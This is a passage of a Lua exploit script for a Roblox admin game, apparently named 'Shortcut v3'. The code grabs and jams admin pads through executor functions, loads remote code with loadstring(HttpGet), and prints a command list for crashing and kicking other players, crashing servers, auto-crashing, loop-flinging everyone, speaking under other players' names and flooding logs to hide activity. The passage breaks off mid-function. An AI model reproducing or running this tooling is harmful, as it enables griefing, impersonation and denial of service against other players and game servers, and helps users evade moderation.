coroutine.wrap(function()
	function MultiThreadAbuse()
		local thread = coroutine.create(function()
			while scriptActive == true do Utils:__wait()
				coroutine.wrap(function() -- PadAbuse
					if testgrab == true then
						for i,pad in pairs(adminFlr.Pads:GetChildren("Head")) do
							coroutine.wrap(function()
								pcall(function()
									local cre = pad.Head
									local spr = plyrs.LocalPlayer.Character.Head
									firetouchinterest(cre, spr, 1)
									Utils:__wait()
									firetouchinterest(cre, spr, 0)

									if pad.Name ~= plyrs.LocalPlayer.Name.."'s admin" then
										fireclickdetector(adminFlr.Regen.ClickDetector, 0)
									end
								end)
							end)()
						end
					end
				end)()
			end
		end)
		coroutine.resume(thread)
	end
	for i = 0, 3 do MultiThreadAbuse() end

	--[[coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiParticles then
					pcall(function()
						for i,v in ipairs(ws:GetDescendants()) do
							if v.Name == "Smoke" or v.Name == "ForceField" or
								v.Name == "Fire"  or v.Name == "Sparkles" or
								v.Name == "Trail"  or v.Name == "EpicCape" or
								v.Name == "ice" or v.Name == "Rainbowify" then
								v:Destroy()
							end
						end
					end)
				end
			end)()
		end
	end)()]]

	--[[coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiSeizure then
					pcall(function()
						for i,v in ipairs(ws:GetDescendants()) do
							if v.Name == "Seizure" then
								v:Destroy()
								game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
							end
						end
					end)
				end
			end)()
		end
	end)()]]

	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if somethingsmart then
					for i,v in ipairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
						if v.Name == "SelectionBox" or v.Name == "LineHandleAdornment" or v.Name == "PaletteGui" then
							v:Destroy()
						end
					end
				end
			end)()
		end
	end)()


	coroutine.wrap(function()
		while scriptActive == true do task.wait(0.25)
			coroutine.wrap(function()
				if antiFun then
					pcall(function()
						for i,v in ipairs(plyrs:GetPlayers()) do
							if v.Name ~= plyrs.LocalPlayer.Name then
								local removeTools
								for _i,_v in ipairs(v.Backpack:GetChildren()) do
									if _v:IsA("Tool") then
										removeTools = v.Character.Name
									end
								end
								for _i,_v in ipairs(v.Character:GetChildren()) do
									if _v:IsA("Tool") then
										removeTools = v.Character.Name
									end
								end
								if removeTools ~= nil then
									chatt("removetools others")
								end
							end
						end
					end)
				end
			end)()
		end
	end)()

	coroutine.wrap(function()
		while scriptActive == true do wait(0.5)
			coroutine.wrap(function()
				if antiSize then
					pcall(function()
						for i,v in ipairs(plyrs:GetPlayers()) do
							if v.Character.Torso.Size.Y ~= 2 then
								chatt("unsize " .. v.Character.Name)
							end
						end
					end)
				end
			end)()
		end
	end)()

	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiSpeed then
					pcall(function()
						local human = plyrs.LocalPlayer.Character.Humanoid
						if human.WalkSpeed ~= 16 then
							human.WalkSpeed = 16
							v.Parent.Parent.HumanoidRootPart.Anchored = true
							task.spawn(function()
								task.wait(0.1)
								v.Parent.Parent.HumanoidRootPart.Anchored = false
							end)
						end
					end)
				end
			end)()
		end
	end)()

	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function() -- Perm
				if perm then
					local spr = plyrs.LocalPlayer.Character:FindFirstChild("Head")
					local tpad = adminFlr.Pads:GetChildren()[9]
					pcall(function()
						local pad = tpad
						local a = pad.Head
						firetouchinterest(a, spr, 1)
						Utils:__wait()
						firetouchinterest(a, spr, 0)
					end)

					if tpad.name ~= plyrs.LocalPlayer.Name.."'s admin" then
						pcall(function()
							fireclickdetector(adminFlr.Regen.ClickDetector, 0)
						end)
					end
				end
			end)()
		end
	end)()
end)() -- End of the utils

task.spawn(function()
	while scriptActive == true do task.wait()
		coroutine.wrap(function() -- Temploopgrab
			if temploopgrab == true then
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
							Utils:__wait()
							firetouchinterest(cre, spr, 0)

							if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
								fireclickdetector(adminFlr.Regen.ClickDetector, 0)
							end
						end)
					end)()
				end
			end
		end)()

		coroutine.wrap(function()
			if emrgrab == true then -- A BIT BROKEN
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
							Utils:__wait()
							firetouchinterest(cre, spr, 0)
							Utils:__wait()
							firetouchinterest(cre, spr, 1)
							firetouchinterest(cre, spr, 0)
						end)
					end)()
				end
			end
		end)()


		coroutine.wrap(function()
			if padAbuse == true then
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
							Utils:__wait()
							firetouchinterest(cre, spr, 0)

							if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
								fireclickdetector(adminFlr.Regen.ClickDetector, 0)
							end
						end)
					end)()
				end
			end
		end)()

		if antiattach == true then
			Utils:__wait()
			for i, v in pairs(game.Players:GetPlayers()) do
				if v.Name ~= lplr.Name then
					if v.Character then
						for i, ch in pairs(v.Character:GetChildren()) do
							if not v.Character:FindFirstChild("Addon") then
								if ch:FindFirstChild("Weld") or ch:FindFirstChild("Snap") then
									game:GetService("RunService").Heartbeat:wait()
									if string.find(v.Name:lower(), "me_", 1, true) then
										chatt("unchar others")
										chatt(prefix.."havefun m")
										chatt(prefix.."testgrab");wait(5.5)
										chatt(prefix.."untestgrab")
										longlogn("Testgrab has been enabled because of an exploiter attaching to objects")
										regen()
									else
										chatt("refresh " .. v.Name)wait(.25)
										chatt(prefix.."havefun " .. v.Name)
										wait(8.5)
										regen()
									end
									task.wait(.1)
									print(v.Name .. " has tried to attach")
								end
							end
						end
					end
				end
			end
		end

		coroutine.wrap(function() --Ignore this pls
			local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
			if oldperm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
			else
				pcall(function()
					local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
					local a = pad.Head
					firetouchinterest(a, spr, 1)
					firetouchinterest(a, spr, 0)
				end)
			end
		end)()
	end
end)

local RunService = game:GetService("RunService")

local pos1 = nil
local pos2 = nil

RunService.RenderStepped:Connect(function()
	if antiTeleport then
		local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

		if pos1 == nil then
			pos1 = humanoidRootPart.CFrame
			pos2 = humanoidRootPart.CFrame
		end

		local distance = (Vector3.new(pos1.x, pos1.y, pos1.z) - Vector3.new(pos2.x, pos2.y, pos2.z)).Magnitude
		--print(math.floor(distance))
		if math.floor(distance) > 8 then
			humanoidRootPart.CFrame = CFrame.new(Vector3.new(pos1.x, pos1.y, pos1.z))
			pos1 = humanoidRootPart.CFrame
			pos2 = humanoidRootPart.CFrame
		else
			pos1 = pos2
			pos2 = humanoidRootPart.CFrame
		end
	end
end)

coroutine.wrap(function()
	local speed = 32
	while scriptActive do
		for i = 0,1,0.001*speed do
			local clr = Color3.fromHSV(i,1,1)
			if rainbowEx == true then
				chatt("colorshiftbottom "..math.floor(clr.R * 1000).." "..math.floor(clr.G * 1000).." "..math.floor(clr.B * 1000))
				chatt("colorshifttop "..math.floor(clr.R * 1000).." "..math.floor(clr.G * 1000).." "..math.floor(clr.B * 1000))
			end
			wait(2 / 6) -- recolor the map x times a second lol.
		end
	end
end

)()

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Button1Down:Connect(function()
	pcall(function()
		local plr = mouse.Target.Parent.Parent
		for i, v in pairs(game.Players:GetPlayers()) do
			pcall(function()
				if mouse.Target.Parent:FindFirstChild("Humanoid") then
					plr = mouse.Target.Parent
				end
			end)
		end
		if plr ~= nil then
			if clickExpode then
				chatt("explode " .. plr.Name .. "  " .. math.random(1, 1000))
			end
		end
	end)
end)

local spam = false

pcall(function()
	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if scriptActive and string.sub(msg:lower(), 0, #prefix) == prefix then
			if msg:lower() == prefix .. "cmds" then
				if shared.secondtimecheck then
					local ClientSound = Instance.new("Sound")
					ClientSound.SoundId = "http://www.roblox.com/asset/?id=5807628661"
					ClientSound.Volume = 1.5
					ClientSound.Parent = workspace
					ClientSound.PlaybackSpeed = 1
					ClientSound:Play();task.wait(.1)
				end
				pcall(function()
					rconsolename("Shortcut v3")
				end)
				wait()
				print("If your executor does not support the rconsole then ping Tech for a complete (up-to-date) list of them.")
				rconsoleprint("----------------------------------------\n")
				rconsoleprint("Some commands are unlisted and can only be found at https://discord.com/channels/1012839686496063539/1014142005057699880/1014142091183525999")
				rconsoleprint("----------------------------------------\n")
				rconsoleprint("@@DARK_GRAY@@")
				rconsoleprint("Section 1, Player kickers\n\n\n\n")
				rconsoleprint("gcrash (plr) --- Use this on perm abusers THAT ARE SPAMMING. (This will fake-kick them though) They have to be spamming commands like respawn, explode, punish etc like crazy to make this a great option. Person299's admin is recommended\n\n")
				rconsoleprint("silv2dc (kinda-OBSOLETE works perfectly on non-perms) --- Attempt to crash someone but without the invis stuff, don't type this out in the chat (Use this to kick non-perm users out of the game.) Note: You have to manually regen if you're using this against non-perms.\n\n")
				rconsoleprint("personslag (plr, reqs person299's admin)--- Attempt to lag someone but with the person299 gamepass' pm method.\n\n")
				rconsoleprint("personscrash (OBSOLETE) (plr, reqs person299's admin)--- Attempt to CRASH someone but with the person299 gamepass' pm method. Also this command is VERY spammy and will probably get you banned\n\n")
				rconsoleprint("v3disconnect (plr, others) --- BRAND NEW FUCKING INSTANT-KICK USE THIS SHIT. Huge credit goes to Snek (and me actually) for discovering this one, and I scripted this into an insta-kick. Feel free to ask me for a blacklist script that can be used to ''ban'' people from your server. UPDATE: Use newmode's ban GUI\n\n")
				rconsoleprint("fastv3dc (plr, others) --- v3disconnect but really fast but is more likely to miss. Use this on spammers\n\n")
				rconsoleprint("\n----------------------------------------\n")
				rconsoleprint("Section 2, Powerful player (others) commands\n\n\n\n")
				rconsoleprint("jail (player) --- A stronger variant of the Kohls jail command inspired by Adonis' jail.\n\n")
				rconsoleprint("playhouse (player) --- A disguise command for disconnect. It's also slightly weaker\n\n")
				rconsoleprint("annoy (player) --- Keeps spam sitting and reseting the player\n\n")
				rconsoleprint("loadreg (player) --- This will load the regen pad for the desired player\n\n")
				rconsoleprint("breakcam --- This breaks the camera of the whole server. This cannot be reverted\n\n")
				rconsoleprint("\n----------------------------------------\n")
				rconsoleprint("Section 3, Commonly used commands\n\n\n\n")
				rconsoleprint("loopgrab --- When loopgrab has been enabled it will repeatedly grab all the pads, with the purpose of jamming the admin for other players\n\n")
				rconsoleprint("disconnect (player) --- Attempts to crash the player out of the server\n\n")
				rconsoleprint("testgrab/testgrab2 --- A faster variant of the loopgrab command with less stability being its only con\n\n")
				rconsoleprint("sban (player) --- Server ban voids the user and spams text which kills their chat UI to simulate the effect of a real kick\n\n")
				rconsoleprint("findresetpad [toregen] --- This will teleport you to the regen pad if it's in the workspace, if it's missing it will attempt to look for it\n\n")
				rconsoleprint("silcrash --- Internal server crashing method that is undetected pretty much with the only con being the requirement of admin\n\n")
				rconsoleprint("shutdown --- VG server crashing method that is detected pretty much with the biggest pro being the instant-server disconnect\n\n")
				rconsoleprint("\n----------------------------------------\n")
				rconsoleprint("Section 4, Fix stuff\n\n\n\n")
				rconsoleprint("fixbp --- This will fix the ground's baseplate\n\n")
				rconsoleprint("fixgvel --- This will fix the ground's velocity\n\n")
				rconsoleprint("fixgrav --- This will fix your gravity\n\n")
				rconsoleprint("fixcollision --- This will fix your object collision\n\n")
				rconsoleprint("fixcam --- This will fix your camera after it's stuck in a forced shiftlock state\n\n")
				rconsoleprint("fixpads --- This will fix reset the position of the admin pads. (Vertically only)\n\n")
				rconsoleprint("killpaintui --- This will fix the paint color GUI being stuck on your screen.\n\n You can also use FIX_MAP__3.0 to fix every map part (community builds)\n\n")
				rconsoleprint("removewater --- This will destroy the water, slowly but surely\n\n")
				rconsoleprint("resetspawn --- This will fix the spawns\n\n")
				rconsoleprint("removeconnections --- This will end most loops and most connections in general like the playerlist \n\n")
				rconsoleprint("noplayerlist --- Remove Shortcut v3's playerlist \n\n")
				rconsoleprint("fixmap --- This will add the Fix Map 3.0 file to your workspace folder, use the load tool to fix the parts\n\n")
				rconsoleprint("findcarpet --- This will find the house carpet or house rock for you if it's missing. Use the load tool to fix it \n\n")
				rconsoleprint("\n----------------------------------------\n")
				rconsoleprint("Section 5, Misc\n\n\n\n")
				rconsoleprint("crazycolors --- Seizure\n\n")
				rconsoleprint("setspawn --- Set the world spawn (requires rejoin)\n\n")
				rconsoleprint("FOV (Num)--- Adjust your Field of View\n\n")
				rconsoleprint("Setmsg (Msg)--- SetMessage inspired from Adonis. Use it with //tspam and h/ to do it the person's admin way\n\n")
				rconsoleprint("Oldantitp --- Anti Teleport (old method)\n\n")
				rconsoleprint("plrattach (plr) --- Attach to the desired player, OR attach the player to the object you're attached to. Used in newv3dc to bypass peoples antis\n\n")
				rconsoleprint("serverhop (or coolshop) --- Server hop but different (formerly rrej)\n\n")
				rconsoleprint("clearlogs --- Spam the logs so it becomes illegible\n\n")
				rconsoleprint("emoji --- Access easy Discord emojis\n\n")
				rconsoleprint("hybridprotection --- Double accounts\n\n")
				--rconsoleprint("poweronly --- This will make you automatically serverhop whenever admin is almost impossible to obtain.\n\n")
				--rconsoleprint("r --- (placeholder) r \n\n")
				rconsoleprint("emrfindregen --- Advanced Regen Finder. Please keep in mind this does not look for specific coords\n\n")
				--rconsoleprint("zoomer --- The FE Zoomer sends out kick requests to exploiters which can result in exploiters getting kicked in under 2 minutes. (does not work on Synapse)\n\n")
				rconsoleprint("runc --- Run a custom command that you have made. Documentation on this can be found in the server\n\n")
				rconsoleprint("unlockprefixes --- This will make anything the prefix for Shortcut v3 commands, from // to ;, :, +, #, e or literally anything\n\n")
				rconsoleprint("Executor --- FE JJSploit, made by Leather128 \n\n")
				rconsoleprint("g(tab)input (Module)--- GUI Input, press GUI buttons using commands. Useful for start-ups/runc's. Documentation on this can be found in the server \n\n")
				rconsoleprint("griefmode --- This will loopfling everyone. You don't need admin for this command. \n ORIGINAL LINK: https://controlc.com/5c0fe603 made by @Digitality \n\n")
				rconsoleprint("antipermv2 --- Whitelist non-perm users for the permaslock. \n\n")
				rconsoleprint("psave (plr)--- Whitelist someone for the permaslock. \n\n")
				rconsoleprint("chatcontrol --- Talk under other peoples name. This is actually really fun ngl, credit goes to DIY scripts for this one \n\n")
				rconsoleprint("lagtable --- Give yourself a whole bunch of rage tables.\n\n")
				rconsoleprint("filltube --- Spawn in a ton of laggy parts for the crashtube build (coming soon)\n\n")
				rconsoleprint("hint --- Recreation of person299's m/ command but uses Kohls' hint command for it\n\n")
				rconsoleprint("autocrash --- This will give you an open source autocrasher in your Workspace folder. Cut+paste it into your autoexec instead. WARNING: Auto crashing massively just to kill the entire game can result in a ban from KAHC\n\n")
				rconsoleprint("ungearban --- Undo the portable justice gearban\n\n")
				rconsoleprint("hairdryer (plr, others) --- This will give the player a hairdryer. Also it may look more like a hairbrush but the bottom of the stamper looks like a hot thing that's used to dry wet hair. Capybara calls this ''Mia's hairbrush'' lol\n\n")
				rconsoleprint("doublecounter (Person 299's admin recommended) --- Anti-alts basically. With this, every account under the age of 21 days old will NOT be able to join.\n\n")
				rconsoleprint("freezesize (Reqs Person 299's admin) --- Create a part that is sized like an ice part.\n\n")
				rconsoleprint("anchorpart (Reqs Person 299's admin) --- Anchor person299 parts using a part/network ownership exploit.\n\n")
				rconsoleprint("randomtheme --- Chooses a random SCV3 start-up theme\n\n")
				rconsoleprint("\n----------------------------------------\n")
				rconsoleprint("@@LIGHT_RED@@")
				rconsoleprint("PLEASE USE THE RCONSOLE IN FULLSCREEN AND SCROLL ALL THE WAY TO THE TOP. \n \n Keybind controls below. \n")
				rconsoleprint("@@LIGHT_BLUE@@")
				rconsoleprint('\n Btools can be used with the keybind K \n \n invisible "J" \n antiMessage "P" \n Pads "n" \n tp me me me "b" \n respawn "v" \n reset "c" \n ff "x" \n fly "z" Mouseattach (aim mouse at object) "m" \n Stop spamming "f" \n\n and Serverlock "L"\n Please check the changelogs every now and then to find new commands. \n Delete v3disconnecting.json to disable newmode. (not v3disconnect)')
				rconsoleprint("@@GREEN@@")
				rconsoleprint("\n And have fun using our script in a semi-dead game with a big dedicated exploiting community :)")
				task.wait(.35)
				pcall(function()
					printconsole' KEYBIND CONTROLS \n Btools (Premium only) "K" \n invisible "J" \n antiMessage "P" \n Pads "n" \n tp me me me "b" \n respawn "v" \n reset "c" \n ff "x" \n fly "z" Mouseattach (aim mouse at object) "m" \n Stop spamming "f" \n\n and Serverlock "L" ' end)
				local bloop = true -- The brrrrrrrooooop sound whenever you click on cmds
				shared.secondtimecheck = false
			end

			if msg:lower() == prefix .. "hybridprotection" then
				antiSetgrav = true ;task.wait(.15)
				antiSpeed = true ;task.wait(.15)
				antiattach = true
				antiBlind = true
				perm = true ;task.wait(.15)
				antiTeleport = true
				chatt("god me")
				chatt("setgrav me 9e9")
				local ClientSound = Instance.new("Sound")
				ClientSound.SoundId = "http://www.roblox.com/asset/?id=5807628661"
				ClientSound.Volume = 1.5
				ClientSound.Parent = workspace
				ClientSound.PlaybackSpeed = 1
				ClientSound:Play();task.wait()
				rconsoleprint("Download ''Roblox Account Manager 2.8'' \n\n")
				rconsoleprint("Create an account named "..game.Players.LocalPlayer.Name.."s (with the s or any other character that extends your username)\n\n")
				rconsoleprint("Use the alt manager to spawn in that account while you're still in the game on your main (primary)\n\n")
				rconsoleprint("Then rejoin the game on your main\n\n")
				rconsoleprint("\n\n You should now be immune to a lot of commands \n\n\n Run this command again afterwards (very tiny banrisk though for spamming) \n\n\n (It's also recommended to give your double/clone account a different display name)")
				chatt("setgrav "..game.Players.LocalPlayer.Name.." -9e9");task.wait(.65)
				chatt(":punish "..game.Players.LocalPlayer.Name);task.wait()
				chatt("punish "..game.Players.LocalPlayer.Name)
				regen()
				wait(.65)
				chatt("h \n\n\n " .. game.Players.LocalPlayer.DisplayName.." is now Hybrid Protected \n\n\n Advanced Blacklist Protection by Shortcut")
				longlogn("Many antis have been auto-enabled to prevent commands from being used on you as well")
				longlogn("Soft Anti Punish is recommended instead of the regular Anti Punish in this mode")
				antiTeleport = true
				for i = 1, 420 do
					wait(36.5)
					chatt("skydive "..math.random(99999).." "..game.Players.LocalPlayer.Name.." "..math.random(99999));task.wait(.65)
					chatt("punish "..math.random(99999).." "..game.Players.LocalPlayer.Name.." "..math.random(99999))
				end
			end

			if msg:lower() == prefix .. "crazycolors" then
				chatt("fogend while true do end")
				soundvis = false
				ccolors = true
			end

			if msg:lower() == prefix .. "findresetpad" then
				chatt("blind me,me,me");Utils.Task:wait(1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(1000000, -3, -1000000));Utils.Task:wait(1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(-1000000, -3, 1000000));Utils.Task:wait(1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(1000000, 1000003, 1000000));Utils.Task:wait(1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(1000000, 3, 1000000));Utils.Task:wait(1)
				chatt("/pads");wait(.1)
				chatt("unblind me me me")
				loadstring(
					game:HttpGet(
						("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/FindVerticalRegen"),
						true
					)
				)()
			end
			if msg:lower() == prefix .. "toregen" then
				loadstring(
					game:HttpGet(
						("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/FindVerticalRegen"),
						true
					)
				)()
			end
			if msg:lower() == prefix .. "infyield" then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();wait(13.5)
				execCmd("showguis")
				execCmd("unkeepiy")
			end
			if msg:lower() == prefix .. "fixpaint" then
				antigear = true
				chatt("ungear all")
				colorAPI = {}

				colorAPI.color = function(Part, color)
					local thread = coroutine.create(function() -- x3.5 speed boost
						local Arguments =
							{
								["Part"] = Part,
								["Color"] = color
							}
						game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Arguments)
					end)
					coroutine.resume(thread)
				end

				colorAPI.transformToColor3 = function(col)
					local r = col.r
					local g = col.g
					local b = col.b
					return Color3.new(r,g,b);
				end

				-- colorAPI.Color3 = function(brickColor)
				--     return colorAPI.transformToColor3(BrickColor.new(brickColor))
				-- end

				colorAPI.colorObbyBox = function(color) -- Default is "Teal"
					for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
						colorAPI.color(v, color) -- colorAPI.transformToColor3(BrickColor.new("Bright red"))
					end
				end

				colorAPI.colorObbyBricks = function(color)-- Default is "Really red"
					for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
						colorAPI.color(v, color)
					end
				end

				colorAPI.colorAdminDivs = function(color)-- Default is "Dark stone grey"
					for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
						colorAPI.color(v, color)
					end
				end

				colorAPI.colorPads = function(color)-- Default is "Bright green"
					for i,v in pairs(game.Workspace.Terrain["_Game"].Admin["Pads"]:GetChildren()) do
						colorAPI.color(v.Head, color)
					end
				end

				colorAPI.colorHouse = function(arg)
					local wallsC = arg.wallsC
					local baseC = arg.baseC
					local roofC = arg.roofC
					local WANDDC = arg.WANDDC
					local stairsC = arg.stairsC
					local floorC = arg.floorC
					local rooftsC = arg.rooftsC
					local chiC = arg.chiC

					-------------------------------------------------------------------- House (really messy ik) --------------------------------------------------------------------

					for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
						coroutine.wrap(function()
							if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
								colorAPI.color(v, wallsC) -- Default is "Brick yellow"
							end -- House walls

							if v.Name == "SmoothBlockModel40" then
								colorAPI.color(v, baseC) -- Default is "Bright green"
							end -- House grass base

							if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
								colorAPI.color(v, roofC) -- Default is "Bright red"
							end -- House roof

